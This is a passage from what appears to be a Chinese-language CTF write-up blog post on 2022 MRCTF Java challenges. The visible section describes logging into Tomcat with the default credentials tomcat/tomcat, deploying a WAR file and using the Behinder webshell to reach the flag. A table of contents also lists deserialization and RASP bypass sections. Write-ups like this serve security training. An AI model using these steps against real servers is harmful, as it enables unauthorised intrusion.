class="code"><pre><span class="line">jmap -dump:format=b,file=e.bin &lt;pid&gt;</span><br></pre></td></tr></table></figure><h2 id="Java-mem-shell-Basic"><a href="#Java-mem-shell-Basic" class="headerlink" title="Java_mem_shell_Basic"></a>Java_mem_shell_Basic</h2><p>可以看见直接是一个tomcat，看了版本没啥可利用的1day，同时版本比较低不存在幽灵猫漏洞</p><p><img src="/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/1.png"></p><p>那么接下来就只能考虑后台弱口令了，<code>tomcat/tomcat</code>，之后部署一个war包上去，直接冰蝎一把梭哈，就是flag位置比较阴间<code>/usr/local/apache-tomcat-8.0.12/work/Catalina/localhost/ROOT/org/apache/jsp/threatbook_jsp.java</code></p></div></article><div class="blog-post-comments"><div id="utterances_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2022MRCTF-Java%E9%83%A8%E5%88%86"><span class="toc-number">1.</span> <span class="toc-text">2022MRCTF-Java部分</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Springcoffee-%E2%80%93-Kryo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E3%80%81%E7%BB%95Rasp"><span class="toc-number">1.2.</span> <span class="toc-text">Springcoffee – Kryo反序列化、绕Rasp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">思路分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-Payload%E6%9E%84%E9%80%A0%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">具体利用过程(Payload构造过程)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95Rasp"><span class="toc-number">1.2.3.</span> <span class="toc-text">绕Rasp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EzJava-%E2%80%93-Bypass-Serialkiller"><span class="toc-number">1.3.</span> <span class="toc-text">EzJava – Bypass Serialkiller</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E8%AF%BB%E7%8E%AF%E5%A2%83"><span class="toc-number">1.3.1.</span> <span class="toc-text">解读环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-number">1.3.2.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#FactoryTransformer"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">FactoryTransformer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-mem-shell-Filter"><span class="toc-number">1.4.</span> <span class="toc-text">Java_mem_shell_Filter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-mem-shell-Basic"><span class="toc-number">1.5.</span> <span class="toc-text">Java_mem_shell_Basic</span></a></li></ol></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&text=2022MRCTF-Java部分"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&title=2022MRCTF-Java部分"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&is_video=false&description=2022MRCTF-Java部分"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=2022MRCTF-Java部分&body=Check out this article: https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&title=2022MRCTF-Java部分"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&title=2022MRCTF-Java部分"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&title=2022MRCTF-Java部分"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&title=2022MRCTF-Java部分"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&name=2022MRCTF-Java部分&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/&t=2022MRCTF-Java部分"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2016-2025 Y4tacker</div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul><ul><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次 </span><span class="post-meta-divider">|</span> <span id="busuanzi_container_site_uv" style="display:none">本站访客数<span id="busuanzi_value_site_uv"></span>人</span><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></ul></nav></div></footer></div><link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload='this.onload=null,this.rel="stylesheet"'><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script><script type="text/javascript">$(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })</script><script src="/js/main.js"></script><script type="text/javascript">var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="https://hm.baidu.com/hm.js?e6d8a6d6d91254d9108e469862e88709";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script><script type="text/javascript">var utterances_repo="Y4tacker/y4tacker.github.io",utterances_issue_term="pathname",utterances_label="Comment",utterances_theme="github-dark";!function(){var t=document.createElement("script");t.src="https://utteranc.es/client.js",t.setAttribute("repo",utterances_repo),t.setAttribute("issue-term","pathname"),t.setAttribute("label",utterances_label),t.setAttribute("theme",utterances_theme),t.setAttribute("crossorigin","anonymous"),t.async=!0,document.getElementById("utterances_thread").appendChild(t)}()</script></body></html>